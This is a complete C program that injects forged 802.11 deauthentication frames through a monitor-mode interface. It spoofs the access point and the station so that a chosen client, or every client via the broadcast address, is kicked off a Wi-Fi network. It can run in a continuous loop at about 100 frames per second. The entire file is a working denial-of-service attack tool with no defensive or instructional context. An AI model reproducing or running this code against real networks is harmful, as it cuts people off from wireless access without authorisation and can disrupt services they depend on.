/* Minimal 802.11 deauth injector for a monitor-mode interface (radiotap + mgmt frame).
 * Usage: deauth <mon_iface> <ap_bssid> <station|ff:ff:ff:ff:ff:ff> <count|0=loop> [reason]
 * MACs as aa:bb:cc:dd:ee:ff. count 0 = continuous until killed. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

static int parse_mac(const char *s, unsigned char *m){
    return sscanf(s,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6;
}
int main(int argc,char**argv){
    if(argc<5){fprintf(stderr,"usage: %s <mon_iface> <ap_bssid> <sta|broadcast> <count(0=loop)> [reason]\n",argv[0]);return 2;}
    const char *ifn=argv[1];
    unsigned char ap[6], sta[6];
    if(!parse_mac(argv[2],ap)){fprintf(stderr,"bad ap bssid\n");return 2;}
    if(!strcmp(argv[3],"broadcast")){memset(sta,0xff,6);} else if(!parse_mac(argv[3],sta)){fprintf(stderr,"bad station\n");return 2;}
    long count=atol(argv[4]);
    unsigned short reason= argc>5? (unsigned short)atoi(argv[5]):7;

    int s=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
    if(s<0){perror("socket");return 1;}
    struct ifreq ifr; memset(&ifr,0,sizeof ifr); strncpy(ifr.ifr_name,ifn,IFNAMSIZ-1);
    if(ioctl(s,SIOCGIFINDEX,&ifr)<0){perror("SIOCGIFINDEX");return 1;}
    struct sockaddr_ll sll; memset(&sll,0,sizeof sll);
    sll.sll_family=AF_PACKET; sll.sll_ifindex=ifr.ifr_ifindex; sll.sll_halen=6;

    /* radiotap header: ver0,pad0,len8,present0 */
    unsigned char rtap[8]={0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00};
    /* deauth frame: AP->STA (a1=sta a2=ap a3=ap) and STA->AP (a1=ap a2=sta a3=ap) */
    unsigned char f1[26], f2[26], pkt[64]; size_t plen;
    /* frame control: 0xC0 (mgmt, deauth subtype 12), 0x00 */
    unsigned char base[26]={0xC0,0x00,0x00,0x00, 0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0, 0x00,0x00, 0,0};
    /* f1: a1=sta, a2=ap, a3=ap (AP deauthing STA) */
    memcpy(f1,base,26); memcpy(f1+4,sta,6); memcpy(f1+10,ap,6); memcpy(f1+16,ap,6);
    f1[24]=reason&0xff; f1[25]=(reason>>8)&0xff;
    /* f2: a1=ap, a2=sta, a3=ap (STA deauthing AP) */
    memcpy(f2,base,26); memcpy(f2+4,ap,6); memcpy(f2+10,sta,6); memcpy(f2+16,ap,6);
    f2[24]=reason&0xff; f2[25]=(reason>>8)&0xff;

    long sent=0;
    for(long i=0; count==0 || i<count; i++){
        /* send AP->STA */
        plen=0; memcpy(pkt,rtap,8); plen=8; memcpy(pkt+plen,f1,26); plen+=26;
        if(sendto(s,pkt,plen,0,(struct sockaddr*)&sll,sizeof sll)>0) sent++;
        /* send STA->AP (skip if broadcast) */
        if(memcmp(sta,"\xff\xff\xff\xff\xff\xff",6)!=0){
            plen=8; memcpy(pkt+8,f2,26); plen=34;
            sendto(s,pkt,plen,0,(struct sockaddr*)&sll,sizeof sll);
        }
        usleep(10000); /* ~100 frames/sec */
        if(count==0 && (i%100)==0){ printf("sent %ld bursts\n",i); fflush(stdout);}
    }
    printf("done, %ld frames sent\n",sent);
    return 0;
}
